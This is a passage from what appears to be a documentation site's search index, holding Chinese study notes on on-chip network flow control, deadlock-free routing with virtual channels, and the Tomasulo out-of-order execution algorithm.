\u200b\u7684\u200b\u76ee\u7684\u5730\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u7ed3\u70b9\u200b\u7684\u200b\u65b9\u5411\u200b\uff0c\u200b\u7136\u540e\u200b\u53d1\u9001\u200b\u3002\u200b\u8fd9\u200b\u5728\u200b\u4ee5\u592a\u7f51\u4ea4\u6362\u673a\u200b\u91cc\u200b\u5f88\u200b\u5e38\u89c1\u200b\uff0c\u200b\u4f46\u662f\u200b\u7f3a\u70b9\u200b\u662f\u200b\u5ef6\u8fdf\u200b\u6bd4\u8f83\u200b\u5927\u200b\u3002\u200b\u5728\u200b\u7247\u200b\u4e0a\u200b\u7f51\u7edc\u200b\u4e2d\u200b\uff0c\u200b\u5b58\u50a8\u8f6c\u53d1\u200b\u6709\u200b\u4e24\u4e2a\u200b\u95ee\u9898\u200b\uff1a\u200b\u4e00\u662f\u200b\u7684\u200b\u5b58\u50a8\u8f6c\u53d1\u200b\u5ef6\u8fdf\u200b\u65e0\u6cd5\u200b\u5ffd\u7565\u200b\uff0c\u200b\u4e8c\u662f\u200b\u9700\u8981\u200b\u6bd4\u8f83\u200b\u5927\u200b\u7684\u200b\u7f13\u51b2\u533a\u200b\u6765\u200b\u4fdd\u5b58\u200b Packet\u3002</p> <p>\u200b\u5728\u200b\u5b58\u50a8\u8f6c\u53d1\u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\u8fdb\u884c\u200b\u4f18\u5316\u200b\uff0c\u200b\u5f97\u5230\u200b\u865a\u62df\u200b\u76f4\u901a\u200b\uff08Virtual Cut-through\uff09\u200b\u65b9\u6cd5\u200b\uff1a\u200b\u6536\u5230\u200b Packet \u200b\u5934\u90e8\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5176\u5b9e\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u77e5\u9053\u200b\u8981\u200b\u8f6c\u53d1\u200b\u7684\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u7ed3\u70b9\u200b\u4e86\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u628a\u200b Packet \u200b\u62c6\u6210\u200b\u66f4\u200b\u5c0f\u200b\u7684\u200b\u5355\u4f4d\u200b\uff0c\u200b\u79f0\u4e3a\u200b Flit\uff08Flow control unit/Flow control digit\uff09\u3002\u200b\u628a\u200b\u4e00\u4e2a\u200b Packet \u200b\u62c6\u200b\u5206\u6210\u200b\u591a\u4e2a\u200b Flit \u200b\u4ee5\u540e\u200b\uff0c\u200b\u7ed3\u70b9\u200b\u63a5\u6536\u200b\u5230\u200b\u7b2c\u4e8c\u4e2a\u200b Flit \u200b\u65f6\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u540c\u6b65\u200b\u53d1\u9001\u200b\u7b2c\u4e00\u4e2a\u200b Flit\uff1b\u200b\u63a5\u6536\u200b\u5230\u200b\u7b2c\u4e09\u4e2a\u200b Flit \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u540c\u6b65\u200b\u53d1\u9001\u200b\u7b2c\u4e8c\u4e2a\u200b Flit\uff0c\u200b\u4f9d\u6b64\u7c7b\u63a8\u200b\u3002\u200b\u7ee7\u7eed\u200b\u53d1\u9001\u200b\u7684\u200b\u524d\u63d0\u200b\u662f\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u7ed3\u70b9\u200b\u7684\u200b\u7f13\u5b58\u200b\u53ef\u4ee5\u200b\u653e\u5f97\u200b\u4e0b\u200b\u4e00\u4e2a\u200b Packet\u3002\u200b\u53ea\u6709\u200b\u7b2c\u4e00\u4e2a\u200b Flit \u200b\u4f1a\u200b\u4fdd\u5b58\u200b\u8def\u7531\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5176\u4f59\u200b\u7684\u200b\u53ea\u200b\u4fdd\u5b58\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u865a\u62df\u200b\u76f4\u901a\u200b\u7f13\u89e3\u200b\u4e86\u200b\u5b58\u50a8\u8f6c\u53d1\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u95ee\u9898\u200b\uff0c\u200b\u63a5\u4e0b\u6765\u200b\u89e3\u51b3\u200b\u7b2c\u4e8c\u4e2a\u200b\u95ee\u9898\u200b\uff0c\u200b\u5373\u200b\u5728\u200b\u7f13\u51b2\u533a\u200b\u5927\u5c0f\u200b\u4e0a\u200b\u8fdb\u884c\u200b\u4f18\u5316\u200b\uff0c\u200b\u5f97\u5230\u200b\u866b\u200b\u5b54\u6d41\u63a7\u200b\uff08Wormhole\uff09\u200b\u65b9\u6cd5\u200b\uff1a\u200b\u7f13\u51b2\u533a\u200b\u4e0d\u200b\u9700\u8981\u200b\u4fdd\u5b58\u200b\u5b8c\u6574\u200b\u7684\u200b Packet\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u80fd\u653e\u5f97\u200b\u4e0b\u200b\u4e00\u4e2a\u200b Flit\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u50cf\u200b\u865a\u62df\u200b\u76f4\u901a\u200b\u90a3\u6837\u200b\u7ee7\u7eed\u200b\u4f20\u8f93\u200b\u3002</p> <p>\u200b\u4f46\u662f\u200b\u866b\u200b\u5b54\u6d41\u63a7\u200b\u51fa\u73b0\u200b\u4e86\u200b\u65b0\u200b\u7684\u200b Head of Line Blocking \u200b\u95ee\u9898\u200b\uff1a\u200b\u5f53\u200b\u7f13\u51b2\u533a\u200b\u6ee1\u200b\u4e86\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e00\u4e2a\u200b Packet \u200b\u7684\u200b\u591a\u4e2a\u200b Flit \u200b\u53ef\u80fd\u200b\u6563\u843d\u200b\u5728\u200b\u591a\u4e2a\u200b\u7ed3\u70b9\u200b\u4e2d\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u7ed3\u70b9\u200b\u90fd\u200b\u56e0\u4e3a\u200b\u540c\u4e00\u4e2a\u200b Packet \u200b\u5835\u585e\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u4f20\u8f93\u200b\u5176\u4ed6\u200b\u6570\u636e\u200b\u3002\u200b\u6bd4\u8f83\u200b\u6781\u7aef\u200b\u7684\u200b\u60c5\u51b5\u200b\u662f\u200b\uff0c\u200b\u540c\u4e00\u4e2a\u200b Packet \u200b\u7684\u200b\u7b2c\u4e00\u4e2a\u200b Flit \u200b\u5df2\u7ecf\u200b\u5230\u8fbe\u200b\u7ec8\u70b9\u200b\uff0c\u200b\u4f46\u662f\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b Flit \u200b\u8fd8\u200b\u5728\u200b\u8d77\u70b9\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5982\u679c\u200b\u51fa\u73b0\u200b\u4e86\u200b\u963b\u585e\u200b\uff0c\u200b\u5c31\u200b\u53ef\u80fd\u200b\u628a\u200b\u6574\u4e2a\u200b\u8def\u5f84\u200b\u4e0a\u200b\u7684\u200b\u7ed3\u70b9\u200b\u5835\u4f4f\u200b\u3002\u200b\u865a\u62df\u200b\u76f4\u901a\u200b\uff08Virtual cut-through\uff09\u200b\u7b97\u6cd5\u200b\u5728\u200b\u51fa\u73b0\u200b\u963b\u585e\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u53d1\u9001\u200b\u65f6\u200b\u5df2\u7ecf\u200b\u4fdd\u8bc1\u200b\u4e86\u200b\u7f13\u51b2\u533a\u200b\u53ef\u4ee5\u200b\u653e\u4e0b\u200b\u6574\u4e2a\u200b Packet\uff0c\u200b\u56e0\u6b64\u200b\u5373\u4f7f\u200b\u51fa\u73b0\u200b\u4e86\u200b\u963b\u585e\u200b\uff0c\u200b\u90e8\u5206\u200b\u7ed3\u70b9\u200b\u8fd8\u662f\u200b\u53ef\u4ee5\u200b\u7ee7\u7eed\u200b\u53d1\u9001\u200b Flit\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u89e3\u51b3\u200b Head of Line Blocking \u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u5f15\u5165\u200b\u4e86\u200b\u865a\u62df\u200b\u901a\u9053\u200b\uff08Virtual Channel\uff09\u200b\u65b9\u6cd5\u200b\uff1a\u200b\u65e2\u7136\u200b Block \u200b\u5728\u200b Head of Line \u200b\u4e0a\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u652f\u6301\u200b\u591a\u4e2a\u200b Line\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u591a\u4e2a\u200b Virtual Channel\u3002\u200b\u867d\u7136\u200b\u7269\u7406\u200b\u4e0a\u200b\u8fd8\u662f\u200b\u539f\u6765\u200b\u7684\u200b\u901a\u9053\u200b\uff0c\u200b\u4f46\u662f\u200b\u903b\u8f91\u200b\u4e0a\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u591a\u4e2a\u200b Virtual Channel\u3002\u200b\u5728\u200b Packet \u200b\u8fdb\u5165\u200b\u7ed3\u70b9\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cPacket \u200b\u4f1a\u200b\u88ab\u200b\u5206\u5230\u200b\u5176\u4e2d\u200b\u4e00\u4e2a\u200b Virtual Channel \u200b\u4e0a\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5982\u679c\u200b\u4e00\u4e2a\u200b Packet \u200b\u5835\u585e\u200b\u4e86\u200b\uff0c\u200b\u53ea\u4f1a\u200b\u5835\u4f4f\u200b\u5b83\u200b\u6240\u5728\u200b\u7684\u200b Virtual Channel\uff0c\u200b\u5176\u4ed6\u200b Virtual Channel \u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u7ee7\u7eed\u200b\u4f20\u8f93\u200b\u3002\u200b\u591a\u4e2a\u200b Virtual Channel \u200b\u7ade\u4e89\u200b\u540c\u4e00\u4e2a\u200b\u7269\u7406\u200b\u901a\u9053\u200b\uff0c\u200b\u91c7\u7528\u200b\u8f6e\u8be2\u200b\u7684\u200b\u65b9\u5f0f\u200b\u4ef2\u88c1\u200b\u3002</p> <p>Virtual Channel \u200b\u52a0\u4e0a\u200b Wormhole Routing \u200b\u662f\u200b\u5e7f\u6cdb\u200b\u4f7f\u7528\u200b\u7684\u200b\u6d41\u63a7\u200b\u7b97\u6cd5\u200b\u3002\u200b\u4e0b\u9762\u200b\u662f\u200b\u4e00\u4e2a\u200b\u6d41\u63a7\u200b\u7b97\u6cd5\u200b\u7684\u200b\u603b\u7ed3\u200b\uff1a</p> \u200b\u94fe\u8def\u200b \u200b\u7f13\u5b58\u200b \u200b\u8bc4\u4ef7\u200b \u200b\u7535\u8def\u200b\u4ea4\u6362\u200b Message N/A (\u200b\u65e0\u200b\u7f13\u5b58\u200b) \u200b\u9700\u8981\u200b\u5efa\u7acb\u200b\u548c\u200b\u786e\u8ba4\u200b \u200b\u5b58\u50a8\u8f6c\u53d1\u200b Packet Packet \u200b\u6536\u5230\u200b\u5b8c\u6574\u200b Packet \u200b\u624d\u200b\u53ef\u4ee5\u200b\u53d1\u9001\u200b \u200b\u865a\u62df\u200b\u76f4\u901a\u200b Packet Packet \u200b\u5934\u200b Flit \u200b\u53ef\u4ee5\u200b\u53d1\u9001\u200b \u200b\u866b\u200b\u5b54\u6d41\u63a7\u200b Packet Flit Head of Line Blocking \u200b\u865a\u62df\u200b\u901a\u9053\u200b Flit Flit \u200b\u4e0d\u540c\u200b\u6570\u636e\u5305\u200b\u7684\u200b\u6570\u636e\u200b\u7247\u200b\u4ea4\u9519\u200b <p>\u200b\u6765\u6e90\u200b\uff1a\u300a\u200b\u9ad8\u7b49\u200b\u8ba1\u7b97\u673a\u7cfb\u7edf\u200b\u7ed3\u6784\u200b\u300b\u200b\u8bfe\u4ef6\u200b</p>"},{"location":"hardware/on_chip_networks.html#_6","title":"\u65e0\u200b\u6b7b\u9501\u200b\u6d41\u63a7","text":"<p>\u200b\u6b64\u5916\u200b\uff0cVirtual Channel \u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u7528\u6765\u200b\u89e3\u51b3\u200b\u6b7b\u9501\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u6b64\u65f6\u200b\u8def\u7531\u200b\u7b97\u6cd5\u200b\u5c31\u200b\u4e0d\u7528\u200b\u8003\u8651\u200b\u6b7b\u9501\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u800c\u662f\u200b\u7531\u200b Virtual Channel \u200b\u6765\u200b\u89e3\u51b3\u200b\u3002</p> <p>\u200b\u56de\u5fc6\u200b\u6b7b\u9501\u200b\u7684\u200b\u573a\u666f\u200b\uff0c\u200b\u6b7b\u9501\u200b\u662f\u56e0\u4e3a\u200b\u51fa\u73b0\u200b\u4e86\u200b\u5faa\u73af\u200b\u4f9d\u8d56\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u6240\u6709\u200b\u7ed3\u70b9\u200b\u7f13\u51b2\u533a\u200b\u90fd\u200b\u6ee1\u200b\u4e86\u200b\uff0c\u200b\u6240\u6709\u200b\u7ed3\u70b9\u200b\u90fd\u200b\u65e0\u6cd5\u200b\u4f20\u8f93\u6570\u636e\u200b\u3002\u200b\u4e3a\u4e86\u200b\u523b\u753b\u51fa\u200b\u4f9d\u8d56\u200b\u60c5\u51b5\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7ed8\u5236\u200b\u51fa\u200b Channel Dependency Graph\uff1a\u200b\u5982\u679c\u200b A \u200b\u5230\u200b B \u200b\u7684\u200b\u4f20\u8f93\u200b Channel \u200b\u4f9d\u8d56\u4e8e\u200b B \u200b\u5230\u200b C \u200b\u7684\u200b\u4f20\u8f93\u200b Channel\uff0c\u200b\u5c31\u200b\u4ece\u200b (A, B) \u200b\u753b\u200b\u4e00\u6761\u200b\u8fb9\u5230\u200b (B, C)\u3002\u200b\u6ce8\u610f\u200b\uff0c\u200b\u539f\u6765\u200b\u7247\u4e0a\u200b\u7f51\u7edc\u62d3\u6251\u200b\u91cc\u200b\u7684\u200b\u8fb9\u200b\uff0c\u200b\u5728\u200b Channel Dependency Graph \u200b\u91cc\u200b\u53d8\u6210\u200b\u4e86\u200b\u70b9\u200b\u3002</p> <p>\u200b\u5f15\u5165\u200b Virtual Channel \u200b\u4ee5\u540e\u200b\uff0c\u200b\u7531\u4e8e\u200b\u6bcf\u4e2a\u200b Virtual Channel \u200b\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b\u7f13\u51b2\u533a\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4ece\u200b A \u200b\u5230\u200b B \u200b\u7684\u200b\u94fe\u8def\u200b\u4e0a\u200b\uff0c\u200b\u76f8\u5f53\u4e8e\u200b\u6709\u200b\u4e86\u200b\u591a\u4e2a\u200b\u4f20\u8f93\u200b Channel\uff0c\u200b\u6bcf\u4e2a\u200b Virtual Channel \u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u4f20\u8f93\u200b Channel\u3002\u200b\u867d\u7136\u200b\u7269\u7406\u200b\u4e0a\u200b\u8fd8\u662f\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b Channel\uff0c\u200b\u4f46\u662f\u200b\u4e00\u4e2a\u200b Virtual Channel \u200b\u5728\u200b\u963b\u585e\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e0d\u4f1a\u200b\u5f71\u54cd\u200b\u5176\u4ed6\u200b Virtual Channel \u200b\u7684\u200b\u5de5\u4f5c\u200b\u3002</p> <p>\u200b\u6b64\u65f6\u200b\uff0c\u200b\u7531\u4e8e\u200b\u4e24\u4e2a\u200b\u7ed3\u70b9\u200b\u95f4\u200b\u4e0d\u6b62\u200b\u4e00\u4e2a\u200b Channel\uff0c\u200b\u5373\u4f7f\u200b\u4eba\u4e3a\u200b\u5730\u200b\u7981\u7528\u200b\u4e00\u4e2a\u200b Channel\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u6b63\u5e38\u200b\u4f20\u8f93\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e5f\u200b\u6253\u7834\u200b\u4e86\u200b\u73af\u200b\u3002\u200b\u4ee5\u4e0b\u200b\u56fe\u4e3a\u4f8b\u200b\uff1a\u200b\u4e0b\u56fe\u200b (a) \u200b\u5de6\u4fa7\u200b\u4e2d\u200b \\(n_1\\) \u200b\u5230\u200b \\(n_4\\) \u200b\u662f\u200b\u7ec4\u6210\u200b\u73af\u200b\u7684\u200b\u56db\u4e2a\u200b\u7ed3\u70b9\u200b\uff0c\u200b\u56db\u4e2a\u200b Channel \u200b\u4e92\u76f8\u200b\u4f9d\u8d56\u200b\uff0c\u200b\u56e0\u6b64\u200b Channel Dependency Graph \u200b\u51fa\u73b0\u200b\u4e86\u200b\u73af\u200b\uff08\u200b\u4e0b\u56fe\u200b (a) \u200b\u53f3\u4fa7\u200b\uff09\uff1b\u200b\u5f15\u5165\u200b\u4e86\u200b Virtual Channel \u200b\u4ee5\u540e\u200b\uff0c\u200b\u76f8\u90bb\u200b\u7ed3\u70b9\u200b\u95f4\u200b\u5c31\u200b\u6709\u200b\u4e86\u200b\u4e24\u4e2a\u200b Channel\uff0c\u200b\u6b64\u65f6\u200b\u7981\u7528\u200b \\(c_{00}\\) \u200b\u901a\u9053\u200b\uff0c\u200b\u5e76\u4e14\u200b\u7ea6\u5b9a\u200b Channel \u200b\u7684\u200b\u4f18\u5148\u7ea7\u200b\uff0c\u200b\u90a3\u4e48\u200b Channel Dependency Graph \u200b\u5c31\u200b\u4e0d\u518d\u200b\u6210\u73af\u200b\uff08\u200b\u4e0b\u56fe\u200b (b) \u200b\u53f3\u4fa7\u200b\uff09\uff0c\u200b\u5e76\u4e14\u200b\u7531\u4e8e\u200b\u6570\u636e\u200b\u4e0d\u4f1a\u200b\u7ed5\u200b\u7740\u200b\u73af\u8f6c\u200b\u4e24\u5708\u200b\uff0c\u200b\u4e0d\u200b\u5f71\u54cd\u200b\u53ef\u8fbe\u6027\u200b\u3002</p> <p> </p> \u200b\u4f7f\u7528\u200b Virtual Channel \u200b\u89e3\u51b3\u200b\u6b7b\u9501\u200b\u95ee\u9898\u200b\uff08\u200b\u56fe\u6e90\u200b Deadlock-Free Message Routing in Multiprocessor Interconnection Networks\uff09 <p>\u200b\u53e6\u200b\u4e00\u79cd\u200b\u601d\u8def\u200b\u662f\u200b\u628a\u200b Virtual Channel \u200b\u5206\u6210\u200b\u4e24\u7c7b\u200b\uff0c\u200b\u7b2c\u4e00\u7c7b\u200b\u90fd\u200b\u91c7\u7528\u200b X-Y \u200b\u8def\u7531\u200b\uff0c\u200b\u7b2c\u4e8c\u7c7b\u200b\u90fd\u200b\u91c7\u7528\u200b Y-X \u200b\u8def\u7531\u200b\uff0c\u200b\u8fd9\u6837\u200b\u4e5f\u200b\u4e0d\u4f1a\u200b\u51fa\u73b0\u200b\u6b7b\u9501\u200b\u3002\u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u7ec4\u5408\u200b\u591a\u79cd\u200b\u65e0\u200b\u6b7b\u9501\u200b\u7684\u200b\u8def\u7531\u200b\u7b97\u6cd5\u200b\u3002</p> <p>\u200b\u4e00\u4e2a\u200b\u91cd\u8981\u200b\u7684\u200b\u5b9e\u73b0\u200b\u65b9\u6cd5\u200b\u662f\u200b Escape Virtual Channel\u3002\u200b\u5177\u4f53\u200b\u5730\u200b\uff0c\u200b\u5728\u200b\u591a\u4e2a\u200b Virtual Channel \u200b\u7684\u200b\u573a\u666f\u200b\u4e0b\u200b\uff0c\u200b\u8bbe\u7f6e\u200b\u5176\u4e2d\u200b\u4e00\u4e2a\u200b Virtual Channel\uff0c\u200b\u4f8b\u5982\u200b VC0 \u200b\u4e3a\u200b Escape Virtual Channel\u3002\u200b\u53ea\u6709\u200b VC0 \u200b\u5fc5\u987b\u200b\u91c7\u7528\u200b\u65e0\u200b\u6b7b\u9501\u200b\u7684\u200b\u8def\u7531\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u4f8b\u5982\u200b X-Y \u200b\u8def\u7531\u200b\uff0c\u200b\u5176\u4ed6\u200b Virtual Channel \u200b\u53ef\u4ee5\u200b\u7528\u200b\u53ef\u80fd\u200b\u6b7b\u9501\u200b\u7684\u200b\u8def\u7531\u200b\u7b97\u6cd5\u200b\u3002</p>"},{"location":"hardware/on_chip_networks.html#_7","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>On-Chip Networks, Second Edition</li> </ul>"},{"location":"hardware/ooo_cpu.html","title":"\u4e71\u5e8f\u6267\u884c\u200b CPU","text":""},{"location":"hardware/ooo_cpu.html#tomasulo","title":"\u7ecf\u5178\u200b Tomasulo","text":"<p>\u200b\u53c2\u8003\u200b\u6559\u6750\u200b\uff1aBerkeley CS252\u3002</p> <p>\u200b\u7ecf\u5178\u200b Tomasulo\uff0c\u200b\u4e5f\u200b\u662f\u200b Wikipedia \u200b\u4e0a\u200b\u63cf\u8ff0\u200b\u7684\u200b Tomasulo \u200b\u7b97\u6cd5\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u6838\u5fc3\u200b\u662f\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u3002\u200b\u6307\u4ee4\u200b\u5728\u200b Decode \u200b\u4e4b\u540e\u200b\uff0c\u200b\u4f1a\u200b\u88ab\u200b\u5206\u914d\u200b\u5230\u200b\u4e00\u4e2a\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u4e2d\u200b\u3002\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u6709\u200b\u4ee5\u4e0b\u200b\u7684\u200b\u8fd9\u4e9b\u200b\u5c5e\u6027\u200b\uff1a</p> <ol> <li>Op\uff1a\u200b\u9700\u8981\u200b\u6267\u884c\u200b\u7684\u200b\u64cd\u4f5c\u200b</li> <li>Qj\uff0cQk\uff1a\u200b\u64cd\u4f5c\u6570\u200b\u4f9d\u8d56\u200b\u7684\u200b\u6307\u4ee4\u200b\u76ee\u524d\u200b\u6240\u5728\u200b\u7684\u200b\u4fdd\u7559\u200b\u7ad9\u200b ID</li> <li>Vj\uff0cQk\uff1a\u200b\u64cd\u4f5c\u6570\u200b\u7684\u200b\u503c\u200b</li> <li>Rj\uff0cRk\uff1a\u200b\u64cd\u4f5c\u6570\u200b\u662f\u5426\u200b ready\uff08\u200b\u6216\u8005\u200b\u7528\u200b\u7279\u6b8a\u200b\u7684\u200b Qj\uff0cQk \u200b\u503c\u200b\u8868\u793a\u200b\u662f\u5426\u200b ready\uff09</li> <li>Busy\uff1a\u200b\u8fd9\u4e2a\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u88ab\u200b\u5360\u7528\u200b</li> </ol> <p>\u200b\u6b64\u5916\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b mapping\uff08Wikipedia \u200b\u4e0a\u200b\u53eb\u505a\u200b RegisterStat\uff09\uff0c\u200b\u8bb0\u5f55\u200b\u4e86\u200b\u5bc4\u5b58\u5668\u200b\u662f\u5426\u200b\u4f1a\u200b\u88ab\u200b\u67d0\u4e2a\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u4e2d\u200b\u7684\u200b\u6307\u4ee4\u200b\u5199\u5165\u200b\u3002</p> <p>\u200b\u6307\u4ee4\u200b\u5206\u914d\u200b\u5230\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u67e5\u8be2\u200b RegisterStat\uff0c\u200b\u5f97\u77e5\u200b\u64cd\u4f5c\u6570\u200b\u5bc4\u5b58\u5668\u200b\u662f\u5426\u200b ready\uff0c\u200b\u5982\u679c\u200b\u4e0d\u200b ready\uff0c\u200b\u8bf4\u660e\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5148\u524d\u200b\u7684\u200b\u6307\u4ee4\u200b\u8981\u200b\u5199\u5165\u200b\u8fd9\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u8bb0\u5f55\u200b\u4e0b\u200b\u5bf9\u5e94\u200b\u7684\u200b\u4fdd\u7559\u200b\u7ad9\u200b ID\u3002\u200b\u5f53\u200b\u64cd\u4f5c\u6570\u200b\u90fd\u200b ready \u200b\u4e86\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8fdb\u5165\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\u8ba1\u7b97\u200b\u3002\u200b\u5f53\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u5728\u200b\u6267\u884c\u200b\u5355\u5143\u200b\u4e2d\u200b\u5b8c\u6210\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u672a\u200b\u51fa\u73b0\u200b WAW \u200b\u65f6\u4f1a\u200b\u628a\u200b\u7ed3\u679c\u200b\u5199\u5165\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\uff0c\u200b\u5e76\u4e14\u200b\u901a\u8fc7\u200b Common Data Bus \u200b\u8fdb\u884c\u200b\u5e7f\u64ad\u200b\uff0c\u200b\u76ee\u524d\u200b\u5728\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u4e2d\u200b\u7684\u200b\u6307\u4ee4\u200b\u5982\u679c\u200b\u53d1\u73b0\u200b\uff0c\u200b\u5b83\u200b\u6240\u200b\u9700\u8981\u200b\u7684\u200b\u64cd\u4f5c\u6570\u200b\u521a\u597d\u200b\u8ba1\u7b97\u51fa\u6765\u200b\u4e86\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u628a\u200b\u53d6\u503c\u200b\u4fdd\u5b58\u200b\u4e0b\u6765\u200b\u3002</p> <p>\u200b\u8fd9\u91cc\u200b\u6709\u200b\u4e00\u4e9b\u200b\u7ec6\u8282\u200b\uff1a\u200b\u56e0\u4e3a\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u4e2d\u200b\u7684\u200b\u6307\u4ee4\u200b\u53ef\u80fd\u200b\u8981\u200b\u7b49\u5f85\u200b\u5176\u4ed6\u200b\u6307\u4ee4\u200b\u7684\u200b\u5b8c\u6210\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u4fdd\u8bc1\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\u5229\u7528\u7387\u200b\u66f4\u9ad8\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u540c\u4e00\u4e2a\u200b\u8ba1\u7b97\u200b\u7c7b\u578b\u200b\uff08\u200b\u6bd4\u5982\u200b ALU\uff09\uff0c\u200b\u9700\u8981\u200b\u6709\u200b\u82e5\u5e72\u4e2a\u200b\u540c\u7c7b\u200b\u7684\u200b\u4fdd\u7559\u200b\u7ad9\u200b\uff08\u200b\u6bd4\u5982\u200b Add1\uff0cAdd2\uff0cAdd3\uff09\u3002\u200b\u5728\u200b Wikipedia \u200b\u7684\u200b\u8868\u8ff0\u200b\u4e2d\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u5bf9\u5e94\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\uff0c\u200b\u8fd9\u6837\u200b\u6027\u80fd\u200b\u6bd4\u8f83\u200b\u597d\u200b\uff0c\u200b\u4f46\u200b\u81ea\u7136\u200b\u9762\u79ef\u200b\u4e5f\u200b\u5c31\u200b\u66f4\u200b\u5927\u200b\u3002\u200b\u5982\u679c\u200b\u8282\u7701\u200b\u9762\u79ef\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u51cf\u5c11\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\u7684\u200b\u6570\u91cf\u200b\uff0c\u200b\u7136\u540e\u200b\u6bcf\u4e2a\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\u4ece\u200b\u591a\u4e2a\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u4e2d\u200b\u83b7\u53d6\u200b\u8ba1\u7b97\u200b\u7684\u200b\u6307\u4ee4\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u601d\u8003\u200b\u4e00\u4e0b\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u65b9\u6cd5\u200b\u7684\u200b\u74f6\u9888\u200b\u5728\u200b\u4ec0\u4e48\u200b\u5730\u65b9\u200b\u3002\u200b\u9996\u5148\u200b\uff0c\u200b\u6bcf\u6761\u200b\u6307\u4ee4\u200b\u90fd\u200b\u653e\u5728\u200b\u4e00\u4e2a\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u4e2d\u200b\uff0c\u200b\u5f53\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u6ee1\u200b\u7684\u200b\u65f6\u5019\u200b\u5c31\u200b\u4e0d\u80fd\u200b\u53d1\u5c04\u200b\u65b0\u200b\u7684\u200b\u6307\u4ee4\u200b\u3002\u200b\u5176\u6b21\u200b\uff0c\u200b\u5982\u679c\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\u7684\u200b\u541e\u5410\u200b\u8ddf\u4e0d\u4e0a\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u7684\u200b\u586b\u5145\u200b\u901f\u5ea6\u200b\uff0c\u200b\u4e5f\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u963b\u585e\u200b\u3002</p> 